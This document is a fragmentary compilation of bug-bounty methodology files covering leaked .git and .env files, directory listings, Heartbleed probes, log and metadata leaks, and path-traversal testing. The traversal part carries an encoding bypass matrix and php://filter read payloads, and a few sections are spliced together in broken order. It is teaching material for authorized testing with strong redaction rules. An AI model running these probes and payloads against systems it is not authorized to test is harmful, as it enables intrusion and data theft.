- [V-08: Heartbleed-style memory dump extraction via protocol heartbeat vulnerabilities](#v-08-heartbleed-style-memory-dump-extraction-via-protocol-heartbeat-vulnerabilities)

---

## [Bugbountyskills.md] V-01: Exposed version control repositories and backup management leakage

**Mechanism:** Deploy pipelines copy whole working directories, so `.git/`, `.svn/`,
swap files (`.swp`), and forgotten backups (`app.tar.gz`, `db.sql.bak`, `index.php~`)
sit in the webroot beside live code. Violated assumption: "the dot prefix hides it" —
the server serves any file it can see. Git is worst: `.git/HEAD` plus object recovery
reconstructs *every historical commit*, including secrets "deleted" years ago.

**Preconditions:**
- VCS dir or backup file was deployed with the app and never stripped; the web server has no deny rule for `.git`/backup extensions.
- For full recovery: objects loose or packed and reachable — true when rsync/Docker COPY moved the dir wholesale.

**Detect:**
1. Probe the catalog in `payloads.md` §1: `/git/HEAD`, `/.git/HEAD`, `/.svn/entries`,
   `/.hg/hgrc`, `/.DS_Store`, plus backup extensions on known names: `/index.php.bak`,
   `/.index.php.swp`, `/config.yml~`, `/<app>.tar.gz`, `/dump.sql`.
2. **Validate before believing** — full ladder in `payloads.md` §2: a real `.git/HEAD`
   is `ref: refs/heads/<branch>` (or a 40-hex SHA); a soft-404 returns HTML with 200;
   a honeypot gives a HEAD that never leads to `/git/config` or objects.
3. `/.svn/wc.db` (SVN ≥1.7) should be SQLite — `file` output tells you instantly;
   older SVN: `/.svn/entries` is plain text with revision + URLs.
4. For backups: compare byte size and `Last-Modified` against the live file — a stale
   backup of a since-changed page proves it's a real artifact.

**Proof of concept:**
```bash
curl -sS "https://<TARGET.HOST>/git/HEAD"     # expect: ref: refs/heads/main
curl -sS "https://<TARGET.HOST>/git/config"   # expect: [core], [remote "origin"]
git-dumper "https://<TARGET.HOST>/git/" /tmp/<project>-dump   # authorized, read-only
git -C /tmp/<project>-dump log --oneline | head               # history restored
```

**Confirm:** Two independent signals: HEAD names a branch **and** `/git/config` or a
real object corroborates it (HEAD alone can be a planted page). Cross-check recovered
content against the live site — committed `index.js` should match or predate the deploy.

**False positives:** Soft-404 pages returning 200 (compare body hash against a known-404
path); WAF blocks rendered as 200 HTML; honeypot git dirs (HEAD but no config/objects —
a tripwire; don't keep pulling); `.DS_Store` listing only public assets; backups of
sample/demo data; staging hosts out of scope. A `.bak` of a public JS file is noise.
**403-vs-404 existence control (run it before calling any deny real):** a blanket deny
indistinguishable from existence returns 403 on *nonexistent children too* — e.g.
`/.git/HEAD` 403 meant nothing until `/.git/zzqnonexist` was *also* 403 (⇒ deny rule,
existence unprovable, not clonable) while `/envvars/zzqnonexist` 404 after `/envvars/`
403 ⇒ **real, enumerable directory with resolvable files** (then fuzz filenames). Same
trick separates real from generic at file level: `server-status` 403 + `server-statuz`
404 ⇒ real handler; `/.htaccess` 403 **and** `/.htaccesss` 403 ⇒ generic `.ht*` rule.
**A served `.gitignore` is a ready-made wordlist** (2026-10-24: `/log/ /config/ /cert/
/envvars/` lines led straight to live `envvars/global.php` + `/.config.php`) — read it,
probe its exact paths, and don't stop when the obvious dirs 404: the ignore list maps the
*repo*, the web root may expose only a subset.

**Impact:** Full source disclosure including *historical* secrets and internal structure
— usually enough for a second bug (chain: `sqli-testing` with a leaked connection
string). Reportable even with no secret inside: recovery is trivial and unauthenticated.
State branch, commit count, and whether credentials were found (redacted).

**Remediation:** Exclude VCS/backup artifacts from deploy artifacts (`.dockerignore`, CI
copy rules) and deny `/.git`, `/.svn`, `*.bak`, `*~`, `*.swp` at the web server — plus
rotate anything the history contains; deletion from HEAD doesn't remove it from history.

**CWE / OWASP:** CWE-538 (Sensitive Info in Externally Accessible File), CWE-200 —
OWASP A01:2021; WSTG-INFO-08.

---

## [Bugbountyskills.md] V-05: Arbitrary resource harvesting via unprotected directory indexing filters

**Mechanism:** Servers list directories when no index file exists (`autoindex on`,
IIS `Indexes`, object-store list permission). Violated assumption: "nobody guesses the
URL" — the listing hands over *and* enumerates: `Index of /uploads/` shows
`contract_final.pdf`, `id_scan_2024.jpg`, and stale files never linked but never
deleted. The listing is a filter bypass: you see what the UI would hide.

**Preconditions:**
- Directory lacks an index file (or the lister needs no auth); listing enabled.
- Files inside are fetchable — listing + 403-on-file is a dead end, so check both.

**Detect:**
1. Request dirs with/without trailing slash: `/uploads/`, `/files/`, `/static/`,
   `/backup/`, `/tmp/`, `/export/`, `/data/`, `/private/`. Recognize `Index of /`,
   `parent directory` links, nginx/IIS listing styles, object-store JSON listers.
2. Read the listing for payload value: `.env` inside (→ V-11), `*.sql`/`*.bak` (→ V-01),
   user uploads with PII — the reportable core — and `.git` dirs.
3. Walk one level deep (`/uploads/2024/…`) — depth is where sensitive files hide.
4. Note names the UI deleted but the listing still shows — a leak *and* a hint for
   `path-traversal-testing` about what exists on disk.

**Proof of concept:**
```http
GET /<dir>/ HTTP/1.1
Host: <TARGET.HOST>
```
Observed: 200, `Index of /<dir>/` with N entries including `<sensitive>.pdf` (name only
in evidence). Fetch one file: 200 → harvestable content; 403 → listing-only, downgrade.

**Confirm:** The listing yields a file that (a) fetches and (b) is linked from nowhere
in the app UI — link-check it against sitemap/HTML. That pair separates "index of public
statics" from "arbitrary resource access".

**False positives:** Listings of purely public assets (`/static/css/` of a library
CDN — informational at best); listings containing only `index.html`; fake/soft-404
listings (compare a nonexistent subdir); synthetic sample data; out-of-scope staging;
every file 403ing (listing of names only, low); object-store lists of buckets holding
only a README (apply V-10's bar: public-by-design with no PII = N/A).

**Impact:** Unauthenticated bulk harvesting: "any user's upload in `/<dir>/` is
enumerable and downloadable — filenames alone reveal PII." Severity follows content:
PII/documents → high; source/config → high (V-01/V-11); public statics → informational.
State auth level and count.

**Remediation:** Disable indexing (`autoindex off;` / `Options -Indexes`), serve uploads
via authenticated handlers or signed URLs, and delete rather than hide once unlinked.

**CWE / OWASP:** CWE-548 (Directory Listing), CWE-200 — OWASP A01/A05:2021;
WSTG-INFO-03.

---

## [Bugbountyskills.md] V-08: Heartbleed-style memory dump extraction via protocol heartbeat vulnerabilities

**Mechanism:** A heartbeat length bug (CVE-2014-0160, OpenSSL ≤1.0.1f) lets the client
claim `payload_length` larger than the payload; the server echoes *adjacent heap
memory* — tickets, private keys, cookies, passwords in flight. Violated assumption:
"TLS records are length-checked." The general lesson: any protocol with an unchecked
length field (DTLS, legacy RPC) is the same shape of bug — over-read, not overflow.

**Preconditions:**
- TLS terminated on a vulnerable implementation (classic: OpenSSL 1.0.1–1.0.1f; V-02 banner may hint); heartbeat extension enabled.
- Endpoint in scope and you understand you're touching *other users'* memory — heightened legal care; keep probes minimal (a flood can crash old servers — DoS guardrail).

**Detect:**
1. Fingerprint first: `openssl s_client -connect <TARGET.HOST>:<PORT> -tlsextdebug` —
   is heartbeat advertised?
2. One library probe: `nmap -p <PORT> --script ssl-heartbleed <TARGET.HOST>` or
   `testssl.sh --vulnerable`. One run is the signal — do not loop it against production.
3. Only with explicit authorization: a *single* malformed heartbeat returning bytes
   beyond your payload (report existence + byte count, not content).
4. Same shape elsewhere (DTLS, legacy length-prefixed services) only if the program's
   scope covers them.

**Proof of concept:**
```bash
nmap -p <PORT> --script ssl-heartbleed <TARGET.HOST>

## [Bugbountyskills.md] expected vulnerable output (redacted):

## [Bugbountyskills.md] | ssl-heartbleed: VULNERABLE:

## [Bugbountyskills.md] |   The TLS/DTLS Heartbeat extension returns raw memory

## [Bugbountyskills.md] |   State: VULNERABLE

```

**Confirm:** Two independent signals: nmap **and** testssl.sh agreeing, or the raw probe
returning out-of-payload bytes; plus version corroboration from V-02 (`OpenSSL 1.0.1f`
in banner/ServerHello). A single tool without a corroborating signal stays a lead —
heartbleed scanners false-positive on middleboxes.

**False positives:** Middleboxes/IDS answering on the server's behalf; stale signatures
on patched-but-similar builds (require actual extra bytes returned); "vulnerable" when
the server never negotiates heartbeats on the public endpoint; adjacent TLS issues
(ROBOT, renegotiation) misattributed to heartbleed; misparsed extension support.
Heartbleed is a decade old — most sightings are false; two signals or nothing.

**Impact:** Memory disclosure at handshake: private-key recovery (full TLS
impersonation), session cookies, in-flight credentials of *other users* — the most
severe class here when real. Report capability + byte count; never include captured
memory (others' data) in evidence. Remediation includes key rotation because residency
is unknown.

**Remediation:** Upgrade the TLS terminator to a patched release, restart to purge
resident state, rotate the TLS private key and any possibly-cached session material.

**CWE / OWASP:** CWE-126 (Buffer Over-read), CWE-119 — OWASP A06:2021; CVE-2014-0160.

## [Bugbountyskills.md] Table of contents

- [V-09: Client-side source map leakage for de-obfuscating frontend application logic](#v-09-client-side-source-map-leakage-for-de-obfuscating-frontend-application-logic)
- [V-10: Cloud storage bucket data leaks via open/public AWS S3 / GCP bucket permissions](#v-10-cloud-storage-bucket-data-leaks-via-openpublic-aws-s3--gcp-bucket-permissions)
- [V-11: Leaked infrastructure secrets via exposed environmental files (.env, config.json)](#v-11-leaked-infrastructure-secrets-via-exposed-environmental-files-env-configjson)
- [V-12: API documentation leaks via public Swagger / Postman collection endpoints](#v-12-api-documentation-leaks-via-public-swagger--postman-collection-endpoints)
- [V-13: Verbose log file leaks via unsecured log rotation directories (/log/, /logs/)](#v-13-verbose-log-file-leaks-via-unsecured-log-rotation-directories-log-logs)
- [V-14: Internal domain/hostname leakage via intranet SMTP/email header metadata](#v-14-internal-domainhostname-leakage-via-intranet-smtpemail-header-metadata)
- [V-15: Metadata information extraction from publicly uploaded documents (EXIF data leakage)](#v-15-metadata-information-extraction-from-publicly-uploaded-documents-exif-data-leakage)

---

## [Bugbountyskills.md] → {"version":3, "sources":87, "has_content":true}

```
Evidence: valid map JSON + one original path from `sources[]` (redact any secret found).

**Confirm:** Two signals: (a) `sourcesContent` behaviorally matches the deployed bundle
(map a minified function back — logic lines up), and (b) at least one `sources[]` entry
that appears nowhere in the minified output (internal path/comment). Map present but
`sourcesContent` null → downgrade: structure disclosure only — say which you got.

**False positives:** `.map` URLs 200-ing to SPA-fallback HTML (validate JSON, never
trust status); maps of *vendor* bundles (jQuery — zero value); `sourcesContent` holding
only generated boilerplate (`runtime.js`); maps of a public open-source repo (if the
content is on GitHub, it's not disclosure — but bundled config *differing* from public
repo still is); out-of-scope staging; name-only maps (low).

**Impact:** "Any unauthenticated visitor recovers the full original frontend source,
including <N> internal routes and <redacted finding: API key pattern> that minification
obscured." Medium alone; high when recovered source holds secrets (→ V-06) or reveals
authz logic/hidden endpoints feeding `bac-idor-testing`. Pull maps early — then re-grep
their content for every other variant's patterns.

**Remediation:** Strip `sourceMappingURL` and don't deploy `.map` for private apps
(`hidden-source-maps` only for server-side debugging), or gate maps behind auth —
note stripping doesn't un-ship secrets already in the bundle (rotate, V-06).

**CWE / OWASP:** CWE-532/CWE-200 — OWASP A05:2021; WSTG-INFO-03.

---

## [Bugbountyskills.md] V-11: Leaked infrastructure secrets via exposed environmental files (.env, config.json)

**Mechanism:** `.env`, `config.json`, `application.yml`, `settings.py`,
`wp-config.php.bak`, `docker-compose.yml` land in webroots or get served by misrouted
static handlers. Unlike a JS bundle these hold *server-side* truth: DB strings, SMTP
creds, JWT secrets, cloud keys, internal URLs. Violated assumption: "dotfile =
invisible" (V-01's sibling — payload is config, not code).

**Preconditions:**
- File sits in a web-reachable path (webroot, static mount, or an SPA fallback that serves *any* missing path — check that soft-404 variant).
- It contains real values — CI sometimes ships `.env.example` by mistake; empty template = lead, not finding.

**Detect:**
1. Sweep (`payloads.md` §1): `/.env`, `/.env.prod`, `/.env.backup`, `/config.json`,
   `/config.yml`, `/appsettings.json`, `/application.yml`, `/parameters.yml`,
   `/settings.py`, `/wp-config.php.bak`, `/docker-compose.yml`, `/.dockerenv`.
2. Validate *content*, not status: real `.env` = `KEY=value` lines; real JSON parses
   with values (not `<YOUR_KEY_HERE>`); 200 HTML = soft-404 (`payloads.md` §2).
3. Classify keys: DB (`DB_PASSWORD`, `DATABASE_URL`), auth (`JWT_SECRET`,
   `SESSION_SECRET`), cloud (`AWS_SECRET_ACCESS_KEY`), third-party (`STRIPE_SECRET_KEY`,
   `SENDGRID_API_KEY`), internal hosts (→ V-04 chain).
4. Capability check read-only and only against resources you own/test — decode a JWT
   secret's shape, never forge sessions against real users.

**Proof of concept:**
```http
GET /.env HTTP/1.1
Host: <TARGET.HOST>
```
Observed: 200, `KEY=value` lines — evidence is key *names* + masked value shapes:
`DB_PASSWORD=•••• (16 chars, high-entropy)`, `JWT_SECRET=•••• (32 chars)`,
`AWS_SECRET_ACCESS_KEY=•••• (40 chars)`. List keys, mask values, paste nothing.

**Confirm:** Two signals: structure matches the real config format **and** a value is
plausibly live — entropy/shape matches the service's credential format, or it pairs
with an endpoint seen elsewhere (a `DB_HOST` naming the host V-04 found), or
functional read-only corroboration on a test resource you own. Format alone = lead.

**False positives:** `.env.example`/`.env.dist` templates (no live values); illustrative
configs in docs (`"password": "password"`); frontend configs public *by design*
(`NEXT_PUBLIC_*` — only server-side entries count); open-source demo configs; expired
values pointing at decommissioned hosts (still note — stale, lower severity); soft-404
HTML masquerading as 200 (the classic — validate every time).

**Impact:** "Unauthenticated download of production configuration exposes <N> live
credentials including a DB password and JWT signing secret, granting <capability>."
High/critical when live and privileged; medium for low-sensitivity config; template-only
→ hardening note. Rotation is mandatory — the file may have been public a long time.

**Remediation:** Load config from a secrets manager/env injection outside the webroot,
deny dotfiles at the server (`location ~ /\.` → deny), purge `.bak` templates, and
rotate every credential the file contained.

**CWE / OWASP:** CWE-526, CWE-312, CWE-200 — OWASP A05:2021; WSTG-INFO-05.

---

## [Bugbountyskills.md] V-13: Verbose log file leaks via unsecured log rotation directories (/log/, /logs/)

**Mechanism:** Rotated logs (`error.log`, `access.log.1`, `app-<date>.gz`,
`wp-content/debug.log`) land in the webroot or get served by a static handler that
never considered `.log` fetchable — often alongside directory listings (V-05). Logs are
a *time machine* of secrets: stack traces with paths (V-03), URLs carrying
`?token=`/`?api_key=`, session IDs, internal IPs (V-04), user emails (PII), and
occasionally a full `Authorization` header in a debug line.

**Preconditions:**
- A log path is web-reachable (listing, guessable filename, or static route serving `*.log`).
- The log contains something sensitive (verbose level + real traffic — debug logs are juiciest).

**Detect:**
1. Sweep (`payloads.md` §1): `/logs/`, `/log/`, `/error.log`, `/access.log`,
   `/debug.log`, `/app.log`, `/logs/error.log.1`, `/wp-content/debug.log`,
   `/actuator/logfile`, `/server-status`, `/telescope/requests`, `/_profiler/`.
2. Validate content: timestamped, line-oriented entries (`2024-01-01 12:00 ERROR …`,
   `IP - - [date] "GET /path"`) or gzip magic for `.gz`; 200 HTML/SPA fallback = soft-404.
3. Grep fetched content *locally*: `Bearer `, `Authorization:`, `token=`, `password`,
   `Set-Cookie:`, `Exception`, internal IPs, emails. Record counts and line shapes —
   never the values.
4. Check `Last-Modified`/entry dates: live-appending log = ongoing exposure; archived
   one-off = bounded window — both belong in the report's timeline.

**Proof of concept:**
```http
GET /logs/error.log HTTP/1.1
Host: <TARGET.HOST>
```
Observed: 200, `text/plain`, entries dated <range> with <redacted count> secret-shaped
patterns (14 `Bearer <32+ chars>`, 3 traces with `/opt/<app>/` paths). Evidence =
headers + 1-2 masked sample lines.

**Confirm:** Two signals: (a) entries reference *this* target's real traffic (paths/
hosts unique to it, correlated timestamps), and (b) one sensitive pattern structurally
confirmed (a `Bearer` that decodes as a JWT header — decode, don't replay; an exception
naming a V-04 internal path). Optional live-append check: fetch twice a minute apart —
file grows = actively written.

**False positives:** Default server pages (`Welcome to nginx!` is not a log); synthetic
sample logs in demos (`[LOG] user logged in`); a debug.log containing only *your own*
harmless request lines (echoing you back isn't leaking others); another tenant's logs
on shared hosting (verify whose traffic before attributing — could be *more* severe);
compressed logs you can't legitimately interpret; error pages merely *mentioning* a log
path (that's V-03, not an exposed file); out-of-scope staging.

**Impact:** "Unauthenticated read of application logs exposes <N> session tokens /
credentials / emails across <date range> — harvested tokens enable impersonation until
expiry (→ `bac-idor-testing`); traces disclose internal architecture." Tokens/PII →
high (ask for revocation); stack traces/paths only → medium; public access logs with no
secrets → low. State the time window — "months of exposure" matters.

**Remediation:** Move logs outside the webroot, deny `*.log`/log dirs at the server
(`location ~* \.log$ { deny; }`), disable verbose logging in production, and
revoke/rotate tokens found in historical content.

**CWE / OWASP:** CWE-532 (Sensitive Info in Log File), CWE-200 — OWASP A05:2021;
WSTG-INFO-03.

---

## [Bugbountyskills.md] observed fields (values redacted):

## [Bugbountyskills.md] Author        : <redacted — real name>

## [Bugbountyskills.md] Company       : <internal-company-name>

## [Bugbountyskills.md] Last Modified By : <redacted — employee name>

```
Evidence = field list with values masked per `payloads.md` §6.

**Confirm:** Two signals: (a) metadata attached to a file *the target serves* (verify
the download URL returns it from the target, not some CDN cache of unrelated content),
and (b) content is real, not sample — GPS resolves plausibly in context, or `dc:creator`
matches a name in the app's own content. Re-read with a second tool (exiftool + exiv2)
to rule out parser artifacts on corrupt files.

**False positives:** Stock/promotional photos with the original photographer's
GPS/author (public by design); camera-model-only EXIF (informational — don't call it a
privacy bug); your *own* upload echoing back (only a finding if others can fetch it);
boilerplate (`Creator: Adobe Photoshop`, `Producer: iText`); blank templates
(`Author: Administrator`); CC/government documents whose metadata is published on
purpose; GPS on a company office already public on a map (say why it matters or don't
report); out-of-scope sample galleries.

**Impact:** "Uploaded documents are served with metadata intact, exposing <uploader
identities / GPS coordinates / internal employee names / software versions> to <anyone
with the link / any other user>." GPS tied to a private individual/site → medium-high
(privacy); employee names + internal template paths → medium (recon feeding V-04/OSINT);
device/software fingerprints only → low/informational. Frame as privacy + recon — the
fix is cheap (server-side strip), which programs like.

**Remediation:** Strip metadata server-side on upload (exiftool `-all=`, image
re-encode, docx core-properties scrub, PDF sanitization), keep originals in a
restricted store, and re-serve only sanitized copies.

**CWE / OWASP:** CWE-200, CWE-359 (Exposure of Private Personal Information),
CWE-215 — OWASP A01/A05:2021; GDPR-adjacent personal-data angle.

## [Bugbountyskills.md] >> path-traversal-testing — SKILL.md

*Source: `/root/Myskill/path-traversal-testing/SKILL.md`*

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & endpoint inventory.** Enumerate every place a path or URL enters
   the system: path-ish params (`file`, `path`, `page`, `template`, `doc`,
   `lang`, `include`, `download`, `export`, `img`, `res`), URL-path segments
   and static locations (`/static/`, `/assets/`, `/img/`, `/files/`), archive
   and backup import/extract features, upload features, and remote-URL params
   (`url`, `src`, `load`, `fetch`). Pull routes from JS bundles, OpenAPI specs,
   and historical responses. Sink coverage — not payload cleverness — determines
   what you can find at all.
2. **Parameter & sink mapping.** Classify each candidate: an `include`/
   `require` (code-bearing, escalates), a `readFile`/`fopen`/`sendfile` (read
   class), a webserver-served static location (bypasses app auth entirely), an
   archive extractor (write class), or a remote fetch (RFI/SSRF). Record decode
   layers (edge proxy, WAF, framework auto-decode) and existing filters
   (strip-lists, `basename()`, extension allowlists) — they decide which
   variant and which encoding rung you need.
3. **Variant selection.** Route the observed signal through the table in §3 and
   read the matching section in `references/variants-1.md` or
   `references/variants-2.md`. One signal often maps to several variants
   (`../` blocked *and* `%252e` passing could be V-06 or V-12); test the
   cheapest discriminator first.
4. **Safe probe.** Start with a canary read from `references/payloads.md` §4:
   your own entitled file, a public asset, then `/etc/hostname`. Establish the
   existing-vs-missing oracle (does the app behave differently for files that
   exist?) before any deeper ladder. No system-file reads, no execution
   payloads at this stage.
5. **Confirmation test.** Reproduce with a second, *independent* signal: canary
   content **plus** an error/path differential, an encoded payload working
   **while** the plain one is blocked, a marker that changes when you re-inject
   it. A single signal has plausible alternative explanations (reflection,
   fallback pages, caching); two orthogonal signals do not. This is the step
   juniors skip and the reason traversal reports die in triage.
6. **Impact proof.** Demonstrate the minimum: canary or own-account file read,
   one redacted signature line from a system file, one attacker-controlled
   marker read back from a poisoned log. Stop there. Describe what an attacker
   *could* reach; show only the minimum they did.
7. **False-positive filter.** Work through the variant's **False positives**
   list: input reflection, SPA/404 fallback HTML, WAF challenge pages, cached
   200s, client-side routers, entitled-access reads. Rule every alternative
   explanation out — explicitly — before writing anything up.
8. **Report.** Use the template in §5. Redact secret values, tokens, and other
   users' data; attach raw request/response pairs with canary paths shown as
   placeholders.

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| `../`-style path param returns files or path-revealing errors; depth sweep changes the response | V-03 directory separation invalidation via `../` | `references/variants-1.md` |
| Plain `../` blocked but `....//`, `..././`, `..%2f` works — single-pass strip filter | V-01 LFI filter breaks | `references/variants-1.md` |
| URL-ish param fetched from your server and its content rendered/included in the response | V-02 RFI wrapper pipelines | `references/variants-1.md` |
| First line of `/etc/passwd` or `win.ini` `[fonts]` comes back; tenant dirs mapped by path segment | V-04 core system profile access / isolation mapping | `references/variants-1.md` |
| Behavior changes only when `%00` is present; extension check seems defeated on an old stack | V-05 null byte character injection | `references/variants-1.md` |
| `%252e%252e%252f` (or triple encoding) succeeds where `%2e%2e%2f` is blocked; input echoed double-decoded | V-06 double URL encoding evasion | `references/variants-1.md` |
| Relative `src=`/`href=`/CSS `url()` asset refs + attacker-influenced URL depth; 404 pages carry relative refs | V-07 RPO script masquerading | `references/variants-1.md` |
| Marker injected via User-Agent/URL/username appears when including `/var/log/...` | V-08 log file stalking (log poisoning) | `references/variants-1.md` |
| `php://filter`, `php://input`, `data://`, `zip://` accepted in a path param | V-09 PHP wrapper execution flow | `references/variants-2.md` |
| Archive import/extract feature; entry names containing `../` or absolute paths | V-10 Zip Slip (nested archive unpacking) | `references/variants-2.md` |
| tar/zip/git upload possible; read/serve/hash of uploaded files; link entries accepted | V-11 symlink upload invalidation | `references/variants-2.md` |
| WAF blocks plain `../` but a Unicode/overlong/backslash variant returns file content | V-12 Unicode/UTF-8 slash WAF bypass | `references/variants-2.md` |
| You control `PHPSESSID` and LFI can reach `/var/lib/php/sessions/sess_<id>` (or `/tmp/sess_`) | V-13 PHP session file poisoning | `references/variants-2.md` |
| nginx `static`-style locations; boundary probes like `/static../` return out-of-root files | V-14 nginx alias misconfiguration | `references/variants-2.md` |
| `.env`, `.git/HEAD`, backup files (`~`, `.bak`) served at root or via `/assets/..%2f` | V-15 static-asset mapping misconfiguration | `references/variants-2.md` |

## [Bugbountyskills.md] 4. Verification standard

A confirmed path traversal / file inclusion finding requires all of the
following; anything less is a lead and gets reported as a lead:

1. **Reproducible request + response pair.** Exact request (headers, encoding,
   auth state) and the server's response, reproduced at least twice with the
   same result. Paste-ready for triage.
2. **A second, independent signal.** Two orthogonal proof channels — e.g. canary
   content *plus* an existence/error oracle; encoded payload succeeding *while*
   the plain payload is blocked; a poisoned-log marker that changes when you
   re-inject it *plus* a working canary LFI. One signal can be mimicked by
   reflection, fallbacks, and caching; two cannot plausibly co-occur by accident.
3. **Minimal-impact impact proof.** A canary or own-entitlement file read, or a
   single redacted signature line from an OS file. Never `/etc/shadow`,
   credential dumps, bulk user data, or full config contents in evidence —
   describe reachability, show only the minimum.
4. **False-positive audit documented.** Name the alternatives you ruled out
   (reflection, SPA fallback, WAF page, cached response, entitled access,
   client-side routing) in the report's evidence section.

### [Bugbountyskills.md] Title

`<Vuln type> in <parameter/feature> at <endpoint> (V-XX)`

**Severity:** <Critical/High/...> — one-line justification
**Endpoint:** `GET /<path>` — parameter `<param>` (<auth state required>)
**Summary:** 2-3 sentences: the sink, the controllable source, the proven effect.

**Steps to reproduce:**
1. <Authenticate as <role> / no auth required>
2. Send: `<raw request with <PLACEHOLDER> for canary paths>`
3. Observe: <canary content / redacted signature line / encoded-vs-plain
   differential / marker read-back>

**Impact:** What an attacker gains (which file classes are reachable as
`<user>`, whether app auth is bypassed for static-served files, escalation
path to RCE if an include sink executes) and the realistic worst case.
Describe reachability of secrets — never paste the secrets.

**Evidence:** Redacted request/response pairs; canary proof first; system-file
proof reduced to a single redacted signature line; timestamps for
reproducibility. Show proof of the read, not dumps of data.

**Remediation:** One specific fix for this sink (allowlist lookup, canonical
prefix check on the final path, alias slash fix, archive entry validation…).

**References:** CWE-<XX>; OWASP Top 10 <A0X:2021>; variant V-XX in
path-traversal-testing skill.
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for variants 1-8 and `references/variants-2.md`
for variants 9-15; read `references/payloads.md` when you need request
templates, tool commands, or WAF-evasion encodings.

Each variant section is self-contained: mechanism, preconditions, numbered
detect steps, a proof-of-concept template with `<PLACEHOLDER>` slots, the
independent confirmation signal, false positives, impact phrasing, a
sink-specific remediation, and the CWE/OWASP mapping. Match your observed
signal to §3, open that variant, and work top to bottom.

## [Bugbountyskills.md] 0. Safe-first proof ladder

**Rule: the first signal is always a harmless canary or a file you are already
entitled to (your own account's data). Never open with system files, and never
dump credentials.** Climb in this order and stop at two independent signals:

1. **Entitled read** — your own export/avatar/session data via the path param.
   Zero bystander impact, proves the sink opens files.
2. **Harmless canary** — `/etc/hostname` (Linux), the `[fonts]` header of
   `C:\Windows\win.ini` (Windows), a public asset you planted. OS-unique content
   rules out fixtures and reflection.
3. **Oracle signals** — existence/missing differential (existing file vs
   invented name) or a leaked resolved path in errors. Read-only, and it doubles
   as your confirmation channel.
4. **Minimal system evidence** — if you must show a system file: *one*
   signature line (`root:x:0:0:…`), one section header, or config **key names
   with values redacted**. That is the production evidence ceiling.
5. **Never** request or retain: `/etc/shadow`, private keys, `.aws/credentials`,
   token values, other users' files, bulk `.env` contents, `/proc/*/environ`
   bodies. "Reachable" is a claim; retrieval is not required to make it.

Execution proofs (log/session poisoning with PHP tags, `php://input`,
`data://` code) are **lab-only**: production stops at read-back of a marker you
injected yourself.

## [Bugbountyskills.md] 1. Encoding & normalization matrix

Reading rule: the "decoders that must fire" column is the whole point — a
payload only works when *exactly* that decode chain runs before path resolution.
If one decode is missing you get a literal `%2e…` path (harmless fail); if a
check sits between two decodes you get the classic bypass (V-06/V-12).

| # | Variant | Example payload | Decoders that must fire (in order) | Typical stack | Reality check |
|---|---|---|---|---|---|
| 1 | Plain | `../../../../etc/hostname` | None — only FS path resolution | No filter present | Baseline; always test first (V-03) |
| 2 | Single URL encode | `%2e%2e%2f%2e%2e%2f` · `..%2f` · `%2e%2e/` | One URL-decode (proxy or framework) before resolve | Apache/nginx + most apps | First rung when plain is stripped/blocked |
| 3 | **Double URL encode** | `%252e%252e%252f%252e%252e%252f` | Decode → check → **decode again** (2 passes: edge+app, or check-before-decode) | Layered stacks, WAF+PHP double-`urldecode` | Works only if *two* decoders fire; one pass ⇒ inert literal (V-06) |
| 4 | Triple encode | `%25252e%25252e%25252f` | Three decode passes | Rare (proxy→framework→lib) | Cheap to test once; record which layer consumed each level |
| 5 | **UTF-8 overlong** | `%c0%ae%c0%ae%c0%af` (overlong `. . /`) | A decoder accepting non-shortest UTF-8 forms | Legacy Tomcat/Java (`..%c0%af`), old IIS/PHP | **Dead on modern stacks** — one probe, never assume (V-12) |
| 6 | `%uXXXX` escape | `%u002e%u002e%u002f` | IIS/ASP-style `%u` unicode decode | Legacy IIS only | One probe; expect failure everywhere else |
| 7 | **Backslash variants** | `..\..\` · `..%5c` · `..\../` · `....\\` | Windows path normalization (both separators are `/`) — **or** a filter written for `/` only | Windows targets; filters with `/`-only regex | Linux: `\` is a filename char → payload fails (expected, not "safe") |
| 8 | **Null-byte legacy** | `file.php%00.png` · `../x%00` · `%2500` | C-string truncation at a native boundary (`%2500` needs a 2nd decode too) | PHP < 5.3.4, old C libs, ancient app servers | Dead on modern stacks — one round, then move on (V-05) |
| 9 | **Unicode slash** | `..%ef%bc%8f` (U+FF0F fullwidth) · `..%e2%88%95` (U+2215) · `..%e2%81%84` (U+2044) | NFKC-style normalization of path chars by the backend/OS (rare) | Some .NET/Java/OS combos | Mostly WAF *confusion*: test with a canary round-trip, never assume |
| 10 | **Path-sequence variants** | `....//....//` (strip-`../`-once recursion) · `..././` · `..//` · `....\/` · `..;/` + `/..;/` · `..%09/` `..%0a/` | A single-pass strip filter turns `....//` → `../`; Tomcat path-param stripping removes `..;/`; whitespace decodes inside segments | Filter breaks (V-01), servlet containers, WAF evasion (V-12) | Cheapest wins — test before any exotic encoding |
| 11 | Case / mixed hex | `%2E%2E%2F` · `%2e../` · `.%2e/` · `..%2F` | Case-sensitive literal match on lowercase hex or exact `../` | Naive regex filters/WAF rules | One request each; filters rarely normalize case |
| 12 | Windows extras | `C:\Windows\win.ini` · `file.php.` / `file.php%20` · `::$DATA` | Windows prefix handling; trailing-dot/space trim; NTFS ADS parse | IIS-era / Windows FS | Separate legacy probes (V-05/V-04) — evidence = one signature line |

Also note container tricks for anchoring: `/proc/self/cwd/<FILE>`,
`/proc/self/root/etc/hostname` (resolve through procfs when the app prefixes a
base dir and strips absolute inputs).

## [Bugbountyskills.md] 2. PHP wrapper templates — read-only proof patterns

**Rule: `php://filter` base64-encoding of a known file is *the* safe impact
proof** — it demonstrates arbitrary read with zero code execution. `php://input`
/ `data://` / log-poisoning **execution** escalations are lab-only (guardrail).

```bash

## [Bugbountyskills.md] READ-ONLY impact proof (production-appropriate)

GET /<SINK>?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>

## [Bugbountyskills.md] round-trip check — must decode to exact canary bytes:

curl -s 'https://<TARGET>/<SINK>?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>' \
  | tr -d '\n' | base64 -d 2>/dev/null | head -c 200

## [Bugbountyskills.md] Read-only variants (still no execution)

php://filter/read=convert.base64-encode/resource=<FILE>
php://filter/string.toupper/resource=<FILE>                 # transform proof
php://filter/convert.iconv.UTF-8/convert.base64-encode/resource=<FILE>
php://filter/zlib.deflate|convert.base64-encode/resource=<FILE>   # compact evidence

## [Bugbountyskills.md] Relative anchors when the app prefixes a base dir

php://filter/convert.base64-encode/resource=<KNOWN_LOCAL_FILE>
file://<PLACEHOLDER_CANARY_PATH>
